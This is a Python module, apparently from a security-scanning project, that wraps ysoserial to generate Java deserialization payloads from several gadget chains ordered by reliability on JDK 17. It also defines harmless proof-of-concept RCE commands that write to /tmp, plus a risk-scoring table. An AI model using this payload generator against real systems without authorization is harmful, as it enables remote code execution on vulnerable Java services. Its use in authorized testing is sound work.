"""
java_payloads.py — ysoserial wrapper for Project #48
"""
import os
import subprocess
import tempfile

YSOSERIAL = "tools/ysoserial-all.jar"

JAVA_ADD_OPENS = [
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens=java.base/java.net=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED",
]

# Available CommonsCollections chains (ordered by reliability on JDK 17)
CHAINS = [
    "CommonsCollections6",   # best on JDK 17
    "CommonsCollections5",
    "CommonsCollections7",
    "CommonsBeanutils1",
    "URLDNS",               # non-RCE, DNS callback only
]

def generate_payload(chain, command):
    """
    Generate a ysoserial payload.
    Returns bytes or None on failure.
    """
    cmd = ["java"] + JAVA_ADD_OPENS + [
        "-jar", YSOSERIAL, chain, command
    ]
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            timeout=30,
            check=False,
        )
        if result.returncode == 0 and result.stdout:
            return result.stdout
        return None
    except Exception as e:
        print(f"[!] ysoserial error: {e}")
        return None

def generate_and_save(chain, command, path):
    """Generate payload and save to file. Returns (bytes_len, path) or (0, None)."""
    payload = generate_payload(chain, command)
    if payload is None:
        return (0, None)
    with open(path, "wb") as f:
        f.write(payload)
    return (len(payload), path)

# ---- RCE command templates ----
def touch_command(path="/tmp/java_rce_proof"):
    return f"touch {path}"

def id_to_file_command(path="/tmp/java_id.txt"):
    return f"id > {path}"

def whoami_to_file_command(path="/tmp/java_whoami.txt"):
    return f"whoami > {path}"

def uname_command(path="/tmp/java_uname.txt"):
    return f"uname -a > {path}"

# ---- Risk scoring ----
def score(issue_type):
    return {
        "java_deser_detected": "INFO",
        "java_rce":            "CRITICAL",
        "dns_callback":        "HIGH",
    }.get(issue_type, "MEDIUM")
